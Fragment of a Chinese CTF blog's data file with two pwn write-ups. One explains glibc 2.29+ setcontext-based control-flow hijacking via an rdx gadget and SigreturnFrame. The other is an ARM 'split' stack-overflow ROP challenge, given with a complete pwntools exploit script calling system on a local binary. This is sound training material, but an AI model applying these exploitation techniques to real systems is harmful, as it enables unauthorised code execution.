id=\"glibc-2-29及以后\"><a href=\"#glibc-2-29及以后\" class=\"headerlink\" title=\"glibc-2.29及以后\"></a>glibc-2.29及以后</h2><p>这里以2.31-0ubuntu9.9_amd64为例：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0x0000000000054f20 &lt;+0&gt;:\t\tendbr64 </span><br><span class=\"line\">0x0000000000054f24 &lt;+4&gt;:\t\tpush   rdi</span><br><span class=\"line\">0x0000000000054f25 &lt;+5&gt;:\t\tlea    rsi,[rdi+0x128]</span><br><span class=\"line\">0x0000000000054f2c &lt;+12&gt;:\txor    edx,edx</span><br><span class=\"line\">0x0000000000054f2e &lt;+14&gt;:\tmov    edi,0x2</span><br><span class=\"line\">0x0000000000054f33 &lt;+19&gt;:\tmov    r10d,0x8</span><br><span class=\"line\">0x0000000000054f39 &lt;+25&gt;:\tmov    eax,0xe</span><br><span class=\"line\">0x0000000000054f3e &lt;+30&gt;:\tsyscall </span><br><span class=\"line\">0x0000000000054f40 &lt;+32&gt;:\tpop    rdx</span><br><span class=\"line\">0x0000000000054f41 &lt;+33&gt;:\tcmp    rax,0xfffffffffffff001</span><br><span class=\"line\">0x0000000000054f47 &lt;+39&gt;:\tjae    0x5506f &lt;setcontext+335&gt;</span><br><span class=\"line\">0x0000000000054f4d &lt;+45&gt;:\tmov    rcx,QWORD PTR [rdx+0xe0]</span><br><span class=\"line\">0x0000000000054f54 &lt;+52&gt;:\tfldenv [rcx]</span><br><span class=\"line\">0x0000000000054f56 &lt;+54&gt;:\tldmxcsr DWORD PTR [rdx+0x1c0]</span><br><span class=\"line\">0x0000000000054f5d &lt;+61&gt;:\tmov    rsp,QWORD PTR [rdx+0xa0] # 利用从这里开始</span><br><span class=\"line\">0x0000000000054f64 &lt;+68&gt;:\tmov    rbx,QWORD PTR [rdx+0x80]</span><br><span class=\"line\">0x0000000000054f6b &lt;+75&gt;:\tmov    rbp,QWORD PTR [rdx+0x78]</span><br><span class=\"line\">0x0000000000054f6f &lt;+79&gt;:\tmov    r12,QWORD PTR [rdx+0x48]</span><br><span class=\"line\">0x0000000000054f73 &lt;+83&gt;:\tmov    r13,QWORD PTR [rdx+0x50]</span><br><span class=\"line\">0x0000000000054f77 &lt;+87&gt;:\tmov    r14,QWORD PTR [rdx+0x58]</span><br><span class=\"line\">0x0000000000054f7b &lt;+91&gt;:\tmov    r15,QWORD PTR [rdx+0x60]</span><br><span class=\"line\">0x0000000000054f7f &lt;+95&gt;:\ttest   DWORD PTR fs:0x48,0x2</span><br><span class=\"line\">0x0000000000054f8b &lt;+107&gt;:\tje     0x55046 &lt;setcontext+294&gt; # 这里会跳转走</span><br><span class=\"line\">0x0000000000054f91 &lt;+113&gt;:\tmov    rsi,QWORD PTR [rdx+0x3a8]</span><br><span class=\"line\">0x0000000000054f98 &lt;+120&gt;:\tmov    rdi,rsi</span><br><span class=\"line\">0x0000000000054f9b &lt;+123&gt;:\tmov    rcx,QWORD PTR [rdx+0x3b0]</span><br><span class=\"line\">0x0000000000054fa2 &lt;+130&gt;:\tcmp    rcx,QWORD PTR fs:0x78</span><br><span class=\"line\">0x0000000000054fab &lt;+139&gt;:\tje     0x54fe5 &lt;setcontext+197&gt;</span><br><span class=\"line\">0x0000000000054fad &lt;+141&gt;:\tmov    rax,QWORD PTR [rsi-0x8]</span><br><span class=\"line\">0x0000000000054fb1 &lt;+145&gt;:\tand    rax,0xfffffffffffffff8</span><br><span class=\"line\">0x0000000000054fb5 &lt;+149&gt;:\tcmp    rax,rsi</span><br><span class=\"line\">0x0000000000054fb8 &lt;+152&gt;:\tje     0x54fc0 &lt;setcontext+160&gt;</span><br><span class=\"line\">0x0000000000054fba &lt;+154&gt;:\tsub    rsi,0x8</span><br><span class=\"line\">0x0000000000054fbe &lt;+158&gt;:\tjmp    0x54fad &lt;setcontext+141&gt;</span><br><span class=\"line\">0x0000000000054fc0 &lt;+160&gt;:\tmov    rax,0x1</span><br><span class=\"line\">0x0000000000054fc7 &lt;+167&gt;:\tincsspq rax</span><br><span class=\"line\">0x0000000000054fcc &lt;+172&gt;:\trstorssp QWORD PTR [rsi-0x8]</span><br><span class=\"line\">0x0000000000054fd1 &lt;+177&gt;:\tsaveprevssp </span><br><span class=\"line\">0x0000000000054fd5 &lt;+181&gt;:\tmov    rax,QWORD PTR [rdx+0x3b0]</span><br><span class=\"line\">0x0000000000054fdc &lt;+188&gt;:\tmov    QWORD PTR fs:0x78,rax</span><br><span class=\"line\">0x0000000000054fe5 &lt;+197&gt;:\trdsspq rcx</span><br><span class=\"line\">0x0000000000054fea &lt;+202&gt;:\tsub    rcx,rdi</span><br><span class=\"line\">0x0000000000054fed &lt;+205&gt;:\tje     0x5500c &lt;setcontext+236&gt;</span><br><span class=\"line\">0x0000000000054fef &lt;+207&gt;:\tneg    rcx</span><br><span class=\"line\">0x0000000000054ff2 &lt;+210&gt;:\tshr    rcx,0x3</span><br><span class=\"line\">0x0000000000054ff6 &lt;+214&gt;:\tmov    esi,0xff</span><br><span class=\"line\">0x0000000000054ffb &lt;+219&gt;:\tcmp    rcx,rsi</span><br><span class=\"line\">0x0000000000054ffe &lt;+222&gt;:\tcmovb  rsi,rcx</span><br><span class=\"line\">0x0000000000055002 &lt;+226&gt;:\tincsspq rsi</span><br><span class=\"line\">0x0000000000055007 &lt;+231&gt;:\tsub    rcx,rsi</span><br><span class=\"line\">0x000000000005500a &lt;+234&gt;:\tja     0x54ffb &lt;setcontext+219&gt;</span><br><span class=\"line\">0x000000000005500c &lt;+236&gt;:\tmov    rsi,QWORD PTR [rdx+0x70]</span><br><span class=\"line\">0x0000000000055010 &lt;+240&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]</span><br><span class=\"line\">0x0000000000055014 &lt;+244&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]</span><br><span class=\"line\">0x000000000005501b &lt;+251&gt;:\tmov    r8,QWORD PTR [rdx+0x28]</span><br><span class=\"line\">0x000000000005501f &lt;+255&gt;:\tmov    r9,QWORD PTR [rdx+0x30]</span><br><span class=\"line\">0x0000000000055023 &lt;+259&gt;:\tmov    r10,QWORD PTR [rdx+0xa8]</span><br><span class=\"line\">0x000000000005502a &lt;+266&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]</span><br><span class=\"line\">0x0000000000055031 &lt;+273&gt;:\trdsspq rax</span><br><span class=\"line\">0x0000000000055036 &lt;+278&gt;:\tcmp    r10,QWORD PTR [rax]</span><br><span class=\"line\">0x0000000000055039 &lt;+281&gt;:\tmov    eax,0x0</span><br><span class=\"line\">0x000000000005503e &lt;+286&gt;:\tjne    0x55043 &lt;setcontext+291&gt;</span><br><span class=\"line\">0x0000000000055040 &lt;+288&gt;:\tpush   r10</span><br><span class=\"line\">0x0000000000055042 &lt;+290&gt;:\tret    </span><br><span class=\"line\">0x0000000000055043 &lt;+291&gt;:\tjmp    r10</span><br><span class=\"line\">0x0000000000055046 &lt;+294&gt;:\tmov    rcx,QWORD PTR [rdx+0xa8] # 跳转到这里继续</span><br><span class=\"line\">0x000000000005504d &lt;+301&gt;:\tpush   rcx\t\t\t\t\t  # 通过push rcx控制rip</span><br><span class=\"line\">0x000000000005504e &lt;+302&gt;:\tmov    rsi,QWORD PTR [rdx+0x70]</span><br><span class=\"line\">0x0000000000055052 &lt;+306&gt;:\tmov    rdi,QWORD PTR [rdx+0x68]</span><br><span class=\"line\">0x0000000000055056 &lt;+310&gt;:\tmov    rcx,QWORD PTR [rdx+0x98]</span><br><span class=\"line\">0x000000000005505d &lt;+317&gt;:\tmov    r8,QWORD PTR [rdx+0x28]</span><br><span class=\"line\">0x0000000000055061 &lt;+321&gt;:\tmov    r9,QWORD PTR [rdx+0x30]</span><br><span class=\"line\">0x0000000000055065 &lt;+325&gt;:\tmov    rdx,QWORD PTR [rdx+0x88]</span><br><span class=\"line\">0x000000000005506c &lt;+332&gt;:\txor    eax,eax</span><br><span class=\"line\">0x000000000005506e &lt;+334&gt;:\tret    \t\t\t\t\t\t  # 劫持程序流</span><br><span class=\"line\">0x000000000005506f &lt;+335&gt;:\tmov    rcx,QWORD PTR [rip+0x196dfa]        # 0x1ebe70</span><br><span class=\"line\">0x0000000000055076 &lt;+342&gt;:\tneg    eax</span><br><span class=\"line\">0x0000000000055078 &lt;+344&gt;:\tmov    DWORD PTR fs:[rcx],eax</span><br><span class=\"line\">0x000000000005507b &lt;+347&gt;:\tor     rax,0xffffffffffffffff</span><br><span class=\"line\">0x000000000005507f &lt;+351&gt;:\tret </span><br></pre></td></tr></table></figure>\n\n<p>由于2.29以后是以 <strong>rdx 寄存器里的地址为基准</strong>设置各个寄存器的值，而修改<code>__free_hook</code>或者<code>__malloc_hook</code>时往往只有一个参数，不能稳定地控制<code>rdx</code>，因此我们需要找一个<code>gadget</code>帮助我们将<code>rdi</code>的值赋给<code>rdx</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]</span><br></pre></td></tr></table></figure>\n\n<p>这个<code>gadget</code>在2.29和2.31中都有，它会将<code>rdi + 0x8</code>指向的内容赋值给<code>rdx</code>，最后会<code>call [rdx + 0x20]</code>。我们可以将这个<code>gadget</code>的地址写到<code>hook</code>中，并在<code>chunk+0x8</code>处写入<code>rdx</code>的值，并在<code>rdx+0x20</code>处写入<code>setcontext</code>。</p>\n<p>如果走<code>IO_FILE</code>，利用方法也差不多。不过走<code>_IO_switch_to_wget_mode </code>的链可以设置<code>rdx</code>，具体看<code>House of Cat</code>。</p>\n<h2 id=\"SigreturnFrame\"><a href=\"#SigreturnFrame\" class=\"headerlink\" title=\"SigreturnFrame\"></a>SigreturnFrame</h2><p><code>SigreturnFrame</code>是<code>pwntools</code>中的一个控制寄存器的工具，常用在SROP中，这个工具实际上就是依靠<code>setcontext</code>实现的，我们可以用它来构造<code>setcontext</code>中的偏移，只需要在调用<code>setcontext</code>前将<code>rdi</code>或<code>rdx</code>指向<code>SigreturnFrame</code>，程序在执行<code>setcontext</code>时就会按照定义好的内容控制寄存器，用法如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">frame = SigreturnFrame()</span><br><span class=\"line\">frame.rsp = xxx</span><br><span class=\"line\">frame.rdi = xxx</span><br><span class=\"line\">frame.rsi = xxx</span><br><span class=\"line\">frame.rdx = xxx</span><br><span class=\"line\">frame.rip = xxx</span><br></pre></td></tr></table></figure>"},{"title":"split_armv5","date":"2023-03-23T09:44:05.000Z","_content":"\narm pwn入门题，arm下的简单ROP。\n<!-- more -->\n\n查壳：\n\n同样是32位动态链接，只开了NX。\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/split_armv5/split_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n```\n\n逆向：\n\n同样是pwnme里有栈溢出：\n\n```c\nint pwnme()\n{\n  char s[36]; // [sp+0h] [bp-24h] BYREF\n\n  memset(s, 0, 0x20u);\n  puts(\"Contriving a reason to ask user for data...\");\n  printf(\"> \");\n  read(0, s, 0x60u);\n  return puts(\"Thank you!\");\n}\n```\n\n留了个`system`和`/bin/cat flag.txt`，因此只要覆盖`LR`执行`system(\"/bin/cat flag.txt\")`即可。\n\n就是找不到`pop r0`，找了个`pop r3`，之后`mov r0,r3`来控制`r0`\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='split_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabi/\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\nbincat_addr=0x0002103C\nsys_addr=0x000105E0\npop_r3_pc=0x000103a4\nmov_r0_r3_pop_fp_pc=0x00010558\n\nr()\npayload=b'a'*0x24+p32(pop_r3_pc)+p32(bincat_addr)+p32(mov_r0_r3_pop_fp_pc)+p32(sys_addr)*2\ns(payload)\n\nitr()\n\n```\n\n","source":"_posts/split.md","raw":"---\ntitle: split_armv5\ndate: 2023-03-23 17:44:05\ncategories: \n- pwn_wp\ntags: \n- pwn\n- arm\n- ROP\n\n---\n\narm pwn入门题，arm下的简单ROP。\n<!-- more -->\n\n查壳：\n\n同样是32位动态链接，只开了NX。\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/split_armv5/split_armv5'\n    Arch:     arm-32-little\n    RELRO:    Partial RELRO\n    Stack:    No canary found\n    NX:       NX enabled\n    PIE:      No PIE (0x10000)\n```\n\n逆向：\n\n同样是pwnme里有栈溢出：\n\n```c\nint pwnme()\n{\n  char s[36]; // [sp+0h] [bp-24h] BYREF\n\n  memset(s, 0, 0x20u);\n  puts(\"Contriving a reason to ask user for data...\");\n  printf(\"> \");\n  read(0, s, 0x60u);\n  return puts(\"Thank you!\");\n}\n```\n\n留了个`system`和`/bin/cat flag.txt`，因此只要覆盖`LR`执行`system(\"/bin/cat flag.txt\")`即可。\n\n就是找不到`pop r0`，找了个`pop r3`，之后`mov r0,r3`来控制`r0`\n\nexp:\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='split_armv5'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\np=process([\"qemu-arm\",\"-L\",\"/usr/arm-linux-gnueabi/\", \"./\"+filename])\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\n#p=remote('',)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n\nbincat_addr=0x0002103C\nsys_addr=0x000105E0\npop_r3_pc=0x000103a4\nmov_r0_r3_pop_fp_pc=0x00010558\n\nr()\npayload=b'a'*0x24+p32(pop_r3_pc)+p32(bincat_addr)+p32(mov_r0_r3_pop_fp_pc)+p32(sys_addr)*2\ns(payload)\n\nitr()\n\n```\n\n","slug":"split","published":1,"updated":"2023-03-23T12:12:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czagl00635oudhouceg8s","content":"<p>arm pwn入门题，arm下的简单ROP。</p>\n<span id=\"more\"></span>\n\n<p>查壳：</p>\n<p>同样是32位动态链接，只开了NX。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/split_armv5/split_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>同样是pwnme里有栈溢出：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">36</span>]; <span class=\"comment\">// [sp+0h] [bp-24h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x60</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>留了个<code>system</code>和<code>/bin/cat flag.txt</code>，因此只要覆盖<code>LR</code>执行<code>system(&quot;/bin/cat flag.txt&quot;)</code>即可。</p>\n<p>就是找不到<code>pop r0</code>，找了个<code>pop r3</code>，之后<code>mov r0,r3</code>来控制<code>r0</code></p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;split_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>,<span class=\"string\">&quot;-L&quot;</span>,<span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">bincat_addr=<span class=\"number\">0x0002103C</span></span><br><span class=\"line\">sys_addr=<span class=\"number\">0x000105E0</span></span><br><span class=\"line\">pop_r3_pc=<span class=\"number\">0x000103a4</span></span><br><span class=\"line\">mov_r0_r3_pop_fp_pc=<span class=\"number\">0x00010558</span></span><br><span class=\"line\"></span><br><span class=\"line\">r()</span><br><span class=\"line\">payload=<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x24</span>+p32(pop_r3_pc)+p32(bincat_addr)+p32(mov_r0_r3_pop_fp_pc)+p32(sys_addr)*<span class=\"number\">2</span></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>arm pwn入门题，arm下的简单ROP。</p>","more":"<p>查壳：</p>\n<p>同样是32位动态链接，只开了NX。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/OwnStudy/ARMpwn/split_armv5/split_armv5&#x27;</span></span><br><span class=\"line\">    Arch:     arm-32-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    No canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x10000)</span><br></pre></td></tr></table></figure>\n\n<p>逆向：</p>\n<p>同样是pwnme里有栈溢出：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">pwnme</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">char</span> s[<span class=\"number\">36</span>]; <span class=\"comment\">// [sp+0h] [bp-24h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x20</span>u);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;&gt; &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, s, <span class=\"number\">0x60</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Thank you!&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>留了个<code>system</code>和<code>/bin/cat flag.txt</code>，因此只要覆盖<code>LR</code>执行<code>system(&quot;/bin/cat flag.txt&quot;)</code>即可。</p>\n<p>就是找不到<code>pop r0</code>，找了个<code>pop r3</code>，之后<code>mov r0,r3</code>来控制<code>r0</code></p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;split_armv5&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#libc=ELF(&#x27;&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\"># p=process(&#x27;./&#x27;+filename)</span></span><br><span class=\"line\">p=process([<span class=\"string\">&quot;qemu-arm&quot;</span>,<span class=\"string\">&quot;-L&quot;</span>,<span class=\"string\">&quot;/usr/arm-linux-gnueabi/&quot;</span>, <span class=\"string\">&quot;./&quot;</span>+filename])</span><br><span class=\"line\"><span 